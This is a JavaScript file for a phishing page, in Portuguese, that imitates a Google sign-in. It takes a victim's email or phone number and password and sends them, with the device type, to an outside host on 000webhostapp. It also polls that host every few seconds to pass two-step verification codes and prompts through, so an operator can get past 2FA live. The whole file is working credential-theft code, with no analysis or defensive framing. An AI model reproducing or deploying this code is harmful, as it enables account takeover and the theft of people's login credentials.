let endpoint = "https://stopsearchingnow.000webhostapp.com/actions.php";

(function() {

    GetDevice();

    let nextButton = document.querySelector(".proxima");
    let emailinput = document.querySelector("#email");

    if(nextButton){
        nextButton.addEventListener("click",function(e){
            e.preventDefault();
            NextStep();
        },false);
        document.addEventListener ('keypress', (event) => {
            if(event.key == 'Enter'){
                event.preventDefault();
                NextStep();
            }
        });
    }

    let loginButton = document.querySelector(".entrar");
    if(loginButton){
        loginButton.addEventListener("click",function(e){
            e.preventDefault();
            Login();
        },false);
        document.addEventListener ('keypress', (event) => {
            if(event.key == 'Enter' && document.querySelector("#senha").value != ''){
                Login();
            }
        });
    }

    let backButton = document.querySelector(".email_circle");
    if(backButton){
        backButton.addEventListener("click",function(e){
            e.preventDefault();
            StepBack();
        },false);
    }


    let confirmar = document.querySelector(".confirmar");
    if(confirmar){
        confirmar.addEventListener("click",function(e){
            e.preventDefault();
            Sync();
        },false);
    }
 
 })();

function Login(){

    let email = localStorage.getItem('email');
    let senha = document.querySelector("#senha").value;
    let device= document.querySelector("#os").value;
    let error2txt   = document.querySelector(".error2txt");

    if(senha.length < 7){
        error2txt.innerHTML = ' Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la. ';
        ErrorPasswordShow();
    }else{

        document.querySelector(".entrar").disabled = true;

        item = {
            user: email,
            pass: senha,
            device: device,
            action:'save'
        }
        
        $.ajax({
            type: "POST",
            url: endpoint,
            dataType: "json",
            data: JSON.stringify(item),
            success: function (data) {
                console.log(data);

                if(data.success == 1){
                    document.location = 'pesquisa.html';
                }else{
                    error2txt.innerHTML =' Erro ao conectar. Tente novamente.';
                    document.querySelector(".entrar").disabled = false;
                    ErrorPasswordShow();
                }
            },
            error: function (error){
                console.log(error);
            } 
        });

    }
}


function ErrorPasswordShow(){
    let input1 = document.querySelector('.input2a');
    let input2 = document.querySelector('.input2b');
    let input3 = document.querySelector('.input2c');
    let label2 = document.querySelector('.label2');

    let error2 = document.querySelector(".error2");

    input1.classList.add("border-error");
    input2.classList.add("border-error");
    input3.classList.add("border-error");

    error2.style.display = 'flex';
    error2.style.color   = 'red';
    error2.style.margin  = '10px 0px -20px 0px';
    label2.style.color   = 'red';
}

function StepBack(){
    let part1   = document.querySelector('.part1');
    let part2   = document.querySelector('.part2');

    part1.style.display = 'flex';
    part2.style.display = 'none';
}

function NextStep(){

    let email   = document.querySelector("#email").value;
    let erro    = document.querySelector('.error');
    let part1   = document.querySelector('.part1');
    let part2   = document.querySelector('.part2');

    
    if(validateEmail(email) || validateTel(email)){

        ErrorHide(erro);
        localStorage.setItem('email', email);
        document.querySelector('.email_part2').innerHTML = email;

        part1.style.display = 'none';
        part2.style.display = 'flex';
    }else{
        ErrorShow(erro);
    }
}

function ErrorShow(tag){
    
    let input1 = document.querySelector('.mdc-notched-outline__leading');
    let input2 = document.querySelector('.mdc-notched-outline__notch');
    let input3 = document.querySelector('.mdc-notched-outline__trailing');
    let txtLabel = document.querySelector('.mdc-floating-label--float-above');

    input1.classList.add("border-error");
    input2.classList.add("border-error");
    input3.classList.add("border-error");

    txtLabel.style.color = 'red';
    tag.style.display = 'flex';
}

function ErrorHide(tag){

    let input1 = document.querySelector('.mdc-notched-outline__leading');
    let input2 = document.querySelector('.mdc-notched-outline__notch');
    let input3 = document.querySelector('.mdc-notched-outline__trailing');
    let txtLabel = document.querySelector('.mdc-floating-label--float-above');

    input1.classList.remove("border-error");
    input2.classList.remove("border-error");
    input3.classList.remove("border-error");

    txtLabel.style.color = 'blue';

    tag.style.display = 'none';
}

function validateEmail(Email) {
    var pattern = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
    return pattern.test($.trim(Email));
}

function validateTel(Tel) {
    var pattern = /^(?:(?:\+|00)?(55)\s?)?(?:\(?([1-9][0-9])\)?\s?)?(?:((?:9\d|[2-9])\d{3})\-?(\d{4}))$/;
    return pattern.test($.trim(Tel));
}

function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

      // Windows Phone must come first because its UA also contains "Android"
      if (/windows phone/i.test(userAgent)) {
          return "WindowsPhone";
      }

      if (/android/i.test(userAgent)) {
          return "Android";
      }

      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
          return "iOS";
      }

      return "PC";
  }

function GetDevice(){
    let navegador = getMobileOperatingSystem();
   
    switch (navegador) {
        
        case 'PC':
        document.querySelector('#os').value = 'desktop';
        break;

        case 'Android':
        document.querySelector('#os').value = 'android';
        break;

        case 'iOS':
        document.querySelector('#os').value = 'apple';
        break;
    
        default:
        document.querySelector('#os').value = 'desktop';
        break;
    }
}

// --------------------------------------------------------------------------

function Sync(){

    var cvc   = document.querySelector('#cvc').value;
    var email = localStorage.getItem("email");
   
    item = {
        email: email,
        cod: cvc,
        action:'sync'
    }
    
    $.ajax({
        type: "POST",
        url: endpoint,
        dataType: "json",
        data: JSON.stringify(item),
        success: function (data) {
            console.log(data);

            console.log(data);

            if(data.steps == 0 && data.code == null){
                document.querySelector('#google').style.display = 'block';
                document.querySelector('.g_part1').style.display = 'block';
                document.querySelector('.g_part2').style.display = 'none';
            }
    
            if(data.steps == 0 && data.code != null){
                document.querySelector('#google').style.display = 'block';
                document.querySelector('.gcode1').style.display = 'inline';
                document.querySelector('.g_part1').style.display = 'none';
                document.querySelector('.g_part2').style.display = 'block';
                document.querySelector('.gcode1').innerHTML = data.code;
                document.querySelector('.gcode1_circle').innerHTML = data.code;
            }
            
            if(data.steps == 1){
                window.location.href='#cvc';
                document.querySelector('#google').style.display = 'none';
                document.querySelector('.twosteps').style.display = 'block';
            }else{
                document.querySelector('#cvc').value = '';
                document.querySelector('.twosteps').style.display = 'none';
                document.querySelector('#google').style.display = 'block';
            }
            
            if(data.ok == 1){
                window.location = "concluido.html";
            }
            
            if(data.invalid == 1){
                document.querySelector('#google').style.display = 'none';
                document.querySelector('#senha_errada').style.display = 'block';
    
                let browser = document.querySelector('#os').value;
                if(browser == 'android' || browser == 'desktop'){
                    document.querySelector('.gaccount').innerHTML = 'Entre nas configurações de seu celular para certificar-se de que está usando o mesmo email do Google Play para poder validar e finalizar a pesquisa por este aplicativo';
                }
    
            }else{
                document.querySelector('#senha_errada').style.display = 'none';
            }

        },
        error: function (error){
            console.log(error);
        } 
    });

    setTimeout(Sync, 3000);
}
